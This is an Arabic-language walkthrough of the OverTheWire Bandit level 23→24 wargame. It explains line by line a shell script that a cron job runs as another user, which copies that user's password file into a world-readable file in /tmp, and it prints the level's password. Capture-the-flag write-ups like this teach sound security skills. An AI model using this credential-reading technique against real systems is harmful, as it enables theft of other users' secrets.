# حل Bandit Level 23 → 24

**التاريخ:** 2025-10-1

---

## الوصف
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

---

## الأدوات المستخدمة
- `cat`
- `chmod`
- `cp`
- `chown`
- `touch`

---

## خطوات الحل (خطوة بخطوة) وشرح كل سطر
1. **إنشاء سكربت `getpass.sh`**
```bash
cat > getpass.sh << 'EOF'
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit24_password
chmod 666 /tmp/bandit24_password
EOF
```
- السطر `#!/bin/bash` يحدد أن السكربت سيتم تشغيله بواسطة `bash`.
- الأمر `cat /etc/bandit_pass/bandit24 > /tmp/bandit24_password` يقوّم بنسخ محتوى ملف كلمة المرور الخاص بـ `bandit24` إلى ملف مؤقت `/tmp/bandit24_password`.
- `chmod 666 /tmp/bandit24_password` يغيّر أذونات الملف لتصبح `rw-rw-rw-` (أي يقدر أي مستخدم قراءة وكتابة الملف).

2. **جعل السكربت قابلًا للتنفيذ**
```bash
chmod +x getpass.sh
```
- هذا يجعل `getpass.sh` قابلاً للتشغيل.

3. **نسخ السكربت إلى مجلد المستخدم `bandit24` المؤقت**
```bash
cp getpass.sh /var/spool/bandit24/foo/
```

4. **تغيير مالك السكربت ليصبح `bandit23`**
```bash
chown bandit23:bandit23 /var/spool/bandit24/foo/getpass.sh
```


5. **قراءة الملف المؤقت للحصول على كلمة المرور**
```bash
cat /tmp/bandit24_password
```
- لأن السكربت (الذي يُشغّل لاحقًا باسم `bandit24`) سيكتب كلمة المرور في هذا الملف ثم يغيّر أذوناته إلى `666`، أي مستخدم آخر يستطيع قراءته باستخدام `cat`.

---

## لماذا تعمل هذه الطريقة؟ (شرح موجز)
- فكرة التحدّي: وجود خدمة أو مجدول (مثل `cron` أو عملية تراقب `foo`) يقوم بتشغيل سكربت باسم `bandit24`، والسكربت ينسخ كلمة المرور إلى ملف في `/tmp` ويجعل أذوناته واسعة (`666`) بحيث يستطيع أي مستخدم آخر قراءته.
- بما إن السكربت يوضع في موقع يمكن للمجدول تشغيله باسم `bandit24`، نحتاج فقط لوضع السكربت الصحيح (أو نسخه) هناك مع الأذونات والملكية المناسبة، ثم الانتظار أو الاعتماد على تشغيل الخدمة ليؤدي لكتابة الملف المؤقت.

---


## كلمة السر (النتيجة)
```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

---

### ملاحظة أخيرة
لا تنسى الصلاة على النبي محمد (صلى الله عليه وسلم).

---

